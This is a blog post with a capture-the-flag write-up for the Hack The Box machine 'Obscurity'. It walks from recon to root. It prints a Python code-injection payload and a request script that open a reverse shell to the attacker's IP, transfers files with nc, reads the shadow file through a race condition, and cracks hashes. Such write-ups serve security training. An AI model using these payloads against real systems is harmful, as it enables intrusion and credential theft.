<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="stylesheet" type="text/css" href="/css/style.css">
  <script src="https://kit.fontawesome.com/65ad30df58.js" crossorigin="anonymous"></script>
  <script src="/dist/mark.min.js" charset="UTF-8"></script>
<title>Hackthebox - Obscurity Writeup &mdash; fmash16's blog</title>
<meta property="og:title" content="Hackthebox - Obscurity Writeup" />
      <meta property="og:description" content="Difficulty " />
      <meta property="og:type" content="article" />
      <meta property="og:url" content="github" />
      <meta property="og:image" content="/img/htb_obscurity/card.png" />

</head>

<body>
  <!-- Side navigation -->
	<div class="sidebar">
    <div class="vertical-center">
      <a href="/index.html" style="text-align:center"><img class="logo" src="/avatar.png" alt=""></a>
      <p style="text-align:center; color:#eee">
      <b style="font-size:1.7em;text-align:center; color:#eee">fmash16</b><br/>
      Student<br/>Infosec & Linux Enthusiast<br/><a href="/about.html" style="color:#0489B1">About me</a></p>
      <p style="text-align:center;font-size:20px">
        <a href="mailto:fmash16@gmail.com" style="display:inline"><i class="far fa-envelope"></i></a> 
        <a href="https://github.com/fmash16" style="display:inline"><i class="fab fa-github"></i></a> 
        <a href="https://twitter.com/fmash16" style="display:inline"><i class="fab fa-twitter"></i></a>
        <a href="https://reddit.com/user/fmash16" style="display:inline"><i class="fab fa-reddit-alien"></i></a>
      </p>
    </div>
	</div>

<article>
<h1 id="hackthebox---obscurity-writeup">Hackthebox - Obscurity Writeup</h1>
<div class="figure">
<img src="/img/htb_obscurity/card.png" />

</div>
<h1 id="initial-foothold">Initial Foothold</h1>
<h2 id="nmap-scan">Nmap scan:</h2>
<pre><code># nmap -sC -sV -sS -oA nmap.out 10.10.10.168</code></pre>
<p>Intersting open ports: * 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) * 80/tcp closed http * 8080/tcp open http-proxy BadHTTPServer * 9000 unknown(nc does not show any banner)</p>
<h2 id="website-at-port-8080">Website at port 8080:</h2>
<ul>
<li>Looks like the server runs custom software for security</li>
</ul>
<div class="figure">
<img src="/img/htb_obscurity/1.png" />

</div>
<ul>
<li>We have some contact information. We see that the box domain is <strong>obscure.htb</strong></li>
</ul>
<div class="figure">
<img src="/img/htb_obscurity/2.png" />

</div>
<ul>
<li>Source code for the web server is in <strong>'SuperSecureServer.py'</strong> in the secret development directory</li>
</ul>
<div class="figure">
<img src="/img/htb_obscurity/3.png" />

</div>
<h2 id="fuzzing-the-site-to-find-the-server-source-code-using-wfuzz">Fuzzing the site to find the server source code using wfuzz:</h2>
<pre><code>wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt --hc 401,402,403,404 http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</code></pre>
<p>Output:</p>
<div class="figure">
<img src="/img/htb_obscurity/4.png" />

</div>
<p>We find the file under a directory called <strong>&quot;develop&quot;</strong></p>
<h2 id="analyze-the-custom-server-source-file">Analyze the custom server source file:</h2>
<p>We get the file using wget:</p>
<pre><code>wget http://10.10.10.168:8080/develop/SuperSecureServer.py</code></pre>
<p>In the source, we find an interesting function <strong>servedoc</strong>:</p>
<div class="figure">
<img src="/img/htb_obscurity/5.png" />

</div>
<p>What intersets us are the following:</p>
<pre><code>path = urllib.parse.unquote(path)
info = &quot;output = &#39;Document: {}&#39;&quot;
exec(info.format(path))</code></pre>
<p>We insert the following payload in the path of our request to the server to get a reverse shell:</p>
<pre><code>/&#39;;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.15.184&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></pre>
<p>So our web url with payload stands as: http://10.10.10.168:8080/';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.15.184&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</p>
<p>We can write a python script that performs the request for us:</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="im">import</span> requests
<span class="im">import</span> os


host <span class="op">=</span> <span class="st">&quot;http://10.10.10.168:8080/&quot;</span>

payload <span class="op">=</span> <span class="st">&quot;</span><span class="sc">%27%</span><span class="st">0Aimport</span><span class="sc">%20s</span><span class="st">ocket%2Csubprocess%2Cos%0As%3Dsocket.socket</span><span class="sc">%28s</span><span class="st">ocket.AF_INET%2Csocket.SOCK_STREAM</span><span class="sc">%29%</span><span class="st">0As.connect</span><span class="sc">%28%</span><span class="st">28%2210.10.14.234</span><span class="sc">%22%</span><span class="st">2C1234</span><span class="sc">%29%</span><span class="st">29%0Aos.dup2</span><span class="sc">%28s</span><span class="st">.fileno</span><span class="sc">%28%</span><span class="st">29%2C0</span><span class="sc">%29%</span><span class="st">0Aos.dup2</span><span class="sc">%28s</span><span class="st">.fileno</span><span class="sc">%28%</span><span class="st">29%2C1</span><span class="sc">%29%</span><span class="st">0Aos.dup2</span><span class="sc">%28s</span><span class="st">.fileno</span><span class="sc">%28%</span><span class="st">29%2C2</span><span class="sc">%29%</span><span class="st">0Ap%3Dsubprocess.call</span><span class="sc">%28%</span><span class="st">5B%22/bin/bash</span><span class="sc">%22%</span><span class="st">2C%22-i</span><span class="sc">%22%</span><span class="st">5D</span><span class="sc">%29%</span><span class="st">0A%27&quot;</span>

requests.get(host<span class="op">+</span>payload)</code></pre></div>
<p>We open a nc listener on port 1337 on our kali and enter the request to get a reverse shell</p>
<div class="figure">
<img src="/img/htb_obscurity/6.png" />

</div>
<p>We upgrade our shell to a fully interactive one:</p>
<div class="figure">
<img src="/img/htb_obscurity/7.png" />

</div>
<h2 id="privilege-escalation---user">Privilege escalation - User:</h2>
<p>We find a user named <strong>robert</strong> in the home directory and find the following files:</p>
<div class="figure">
<img src="/img/htb_obscurity/8.png" />

</div>
<p>The following files interests us: * check.txt * out.txt * passwordreminder.txt * SuperSecureCrypt.py * BetterSSH</p>
<p>We transfer the files to our local machine using nc: On target: nc 10.10.15.184 8888 &lt; SuperSecureCrypt.py On host: nc -lnvp 8888 &gt; SuperSecureCrypt.py</p>
<p>So, we have a custom Crypt here. The contents of the files are:</p>
<div class="figure">
<img src="/img/htb_obscurity/9.png" />

</div>
<p>So, we have to find out the key of the user robert by briyteforcing and then use the key to decrypt the passwordreminder.txt using the script SuperSecureCrypt.py</p>
<p>We write a decryptor in python</p>
<div class="sourceCode"><pre class="sourceCode python"><code class="sourceCode python"><span class="co">#! /usr/bin/env python3</span>
<span class="co"># -*- coding: utf-8 -*-</span>

<span class="im">from</span> __future__ <span class="im">import</span> print_function


<span class="kw">def</span> decrypt(text, key):
    keylen <span class="op">=</span> <span class="bu">len</span>(key)
    keyPos <span class="op">=</span> <span class="dv">0</span>
    decrypted <span class="op">=</span> <span class="st">&quot;&quot;</span>
    <span class="cf">for</span> x <span class="kw">in</span> text:
        keyChr <span class="op">=</span> key[keyPos]
        newChr <span class="op">=</span> <span class="bu">ord</span>(x)
        newChr <span class="op">=</span> <span class="bu">chr</span>((newChr <span class="op">-</span> <span class="bu">ord</span>(keyChr)) <span class="op">%</span> <span class="dv">255</span>)
        decrypted <span class="op">+=</span> newChr
        keyPos <span class="op">+=</span> <span class="dv">1</span>
        keyPos <span class="op">=</span> keyPos <span class="op">%</span> keylen
    <span class="cf">return</span> decrypted

key <span class="op">=</span> <span class="st">&#39;&#39;</span>
pos <span class="op">=</span> <span class="dv">0</span>
<span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;out.txt&quot;</span>, <span class="st">&#39;r&#39;</span>, encoding<span class="op">=</span><span class="st">&#39;UTF-8&#39;</span>) <span class="im">as</span> f:
    data <span class="op">=</span> f.read()

    <span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;check.txt&quot;</span>, <span class="st">&#39;r&#39;</span>, encoding<span class="op">=</span><span class="st">&#39;UTF-8&#39;</span>) <span class="im">as</span> d:
        ch <span class="op">=</span> d.read()
        <span class="cf">for</span> x <span class="kw">in</span> data:
            <span class="cf">for</span> j <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">255</span>):
                <span class="co"># print(pos, end=&#39;&#39;)</span>
                <span class="co"># print(ch[pos], end=&#39;&#39;)</span>
                <span class="bu">print</span>(key <span class="op">+</span> <span class="st">&#39;</span><span class="ch">\n</span><span class="st">&#39;</span>)
                newChr <span class="op">=</span> <span class="bu">ord</span>(x)
                newChr <span class="op">=</span> <span class="bu">chr</span>((newChr <span class="op">-</span> j) <span class="op">%</span> <span class="dv">255</span>)
                <span class="cf">if</span> ch[pos] <span class="op">==</span> newChr:
                    key <span class="op">+=</span> <span class="bu">chr</span>(j)
                    pos <span class="op">=</span> pos <span class="op">+</span> <span class="dv">1</span>
                    <span class="cf">break</span>

<span class="bu">print</span>(key)</code></pre></div>
<p>Running the script, we find the key: <strong>alexandrovich</strong></p>
<p>Now we decrypt the passwordremider.txt:</p>
<div class="figure">
<img src="/img/htb_obscurity/10.png" />

</div>
<p>We found our password for the user. We can use these creds to login using ssh as the user robert and read out user.txt file</p>
<div class="figure">
<img src="/img/htb_obscurity/11.png" />

</div>
<h2 id="privilege-escalation---root">Privilege escalation - Root:</h2>
<p>Running command <code>sudo -l</code>, we find following:</p>
<div class="figure">
<img src="/img/htb_obscurity/12.png" />

</div>
<p>So, we can run the command <code>/usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</code> as root</p>
<p>We have a look at the script BetterSSH.py</p>
<div class="figure">
<img src="/img/htb_obscurity/13.png" />

</div>
<p>We see here that during the login process using the script, it temporarily writes the shadow file into the tmp/SSH file. So we can read the shadow file from the tmp/SSH folder while the ssh login is running. The file is written after taking the password input. But as we run the script, we see that as soon as we enter the password, we get an invalind user error. So, we have a race condition here. What we do is run a while loop in the background that continuosly copies all files in the /tmp/SSH folder into a folder of our own e.g. /tmp/fm. Then if we run our ssh script, the shadow file will get copied into the /tmp/SSH folder and so to our own created dir.</p>
<div class="figure">
<img src="/img/htb_obscurity/14.png" />

</div>
<p>We see a new file in our created directory. We check the contents of the file and get the password hashes.</p>
<div class="figure">
<img src="/img/htb_obscurity/15.png" />

</div>
<p>We see that the hash is an crypt hash.We check the type of the hash using hashcat. SInce it has got $6, this should be sha512crypt.</p>
<div class="figure">
<img src="/img/htb_obscurity/16.png" />

</div>
<p>So now we decrypt the hash with:</p>
<pre><code>hashcat -m 1800 -o root_pass root_hash /usr/share/wordlists/rockyou.txt</code></pre>
<p>And after waiting some time, we get our required root pass in the root_pass file:</p>
<div class="figure">
<img src="/img/htb_obscurity/17.png" />

</div>
<p>We use the password to login as root using su and get our root.txt file</p>
<div class="figure">
<img src="/img/htb_obscurity/18.png" />

</div>
</article>

<footer>
  <p> By fmash16 </p>
</footer>
</body>
